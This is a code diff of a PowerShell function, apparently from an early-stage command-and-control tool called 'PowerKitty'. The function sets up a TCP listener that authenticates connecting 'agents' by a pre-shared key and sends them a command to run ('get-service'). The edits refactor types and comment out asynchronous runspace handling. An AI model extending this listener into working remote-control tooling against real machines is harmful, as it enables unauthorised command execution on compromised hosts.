@@ -12,7 +12,8 @@ Function Global:New-Listerner()
 		[system.net.ipaddress]$LHOST = [system.net.ipaddress]::Loopback,
 
 		[Parameter()]
-		[short]$LPORT,
+		[ValidateRange(1, 65535)]
+		[INT]$LPORT,
 
 		[Parameter()]
 		[String]$PSK
@@ -31,15 +32,14 @@ Function Global:New-Listerner()
 
 	# Create a template listerner object
 	$obj = [pscustomobject]@{
-		Name  = [String]$ListerName
-		UUID  = [String](New-Guid).Guid
-		LHOST = $LHOST
-		LPORT = $LPORT
-		RAWSOCK = $listener
+		Name       = [String]$ListerName
+		UUID       = [String](New-Guid).Guid
+		LHOST      = [system.net.ipaddress]$LHOST
+		LPORT      = [INT]$LPORT
+		RAWSOCK    = [Collections.Generic.List[Object]]$listener
 		AGENTCOUNT = [INT]0
-		RAWAGENT = $null
+		RAWAGENT   = [Collections.Generic.List[PSObject]]$null
 	}
-
 	# add listerner psobject to array
 	$Global:ListernerPool += $obj
 
@@ -56,24 +56,21 @@ Function Global:New-Listerner()
 			"sock!"
 
 			# add agent to listerner
-			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
-			#$agentCount    = $thisListerner.AGENTCOUNT++
-			#$agents        = $thisListerner.RAWAGENT += $client
-			# make this work from pipeline: (get lister | set listerner)
-			#Set-Listerner -RAWAGENT $agents -AGENTCOUNT $agentCount -UUID $obj.UUID
+			#Set-Listerner -AGENTCOUNT 1 -UUID $obj.UUID
 		    
 			# upgrade agent (maybe auth - tty etc)
 			
 			# build a runspace
-			$Runspace            = [runspacefactory]::CreateRunspace()
-			$PowerShell          = [powershell]::Create()
-			$PowerShell.runspace = $Runspace
-			$Runspace.Open()
-			$runspace.SessionStateProxy.SetVariable('C', $client)
-			[void]$PowerShell.AddScript({
+			#$Runspace            = [runspacefactory]::CreateRunspace()
+			#$PowerShell          = [powershell]::Create()
+			#$PowerShell.runspace = $Runspace
+			#$Runspace.Open()
+			#$runspace.SessionStateProxy.SetVariable('C', $client)
+			#[void]$PowerShell.AddScript({
 				
-				$Stream = $C.GetStream()
+				$Stream = $client.GetStream()
 				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
+				$StreamWriter.AutoFlush = $true
 				$StreamReader = New-Object System.IO.StreamReader($Stream)
 
 				# if PSK matches, payload
@@ -98,24 +95,33 @@ Function Global:New-Listerner()
 				$reader.ReadLine()
 				#>
 
-				if($StreamReader.ReadLine() -eq $PSK)
+				# wait for message
+				while(!$Stream.DataAvailable)
 				{
+					# TODO: we need a way here to timeout, to not allow for denial of service
+					Start-Sleep -Milliseconds 100
+					"Waiting for Data"
+				}
+				$agentmessage = $StreamReader.ReadLine()
+				if($agentmessage -eq $PSK)
+				{
+					$agentmessage
 					$StreamWriter.WriteLine("get-service") | Out-Null
 
 				}
 				# else, gtfo
 				else
 				{
-					$Result = [System.Windows.MessageBox]::Show($StreamReader.ReadLine(),"X",1)
+					$agentmessage
 					$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
 				}
 
 				
-				$StreamWriter.Close()
+				#$StreamWriter.Close()
 				$StreamReader.Close()
-			})
+			#})
 
-			$AsyncObject = $PowerShell.BeginInvoke()
+			#$AsyncObject = $PowerShell.BeginInvoke()
 			
 
 		}
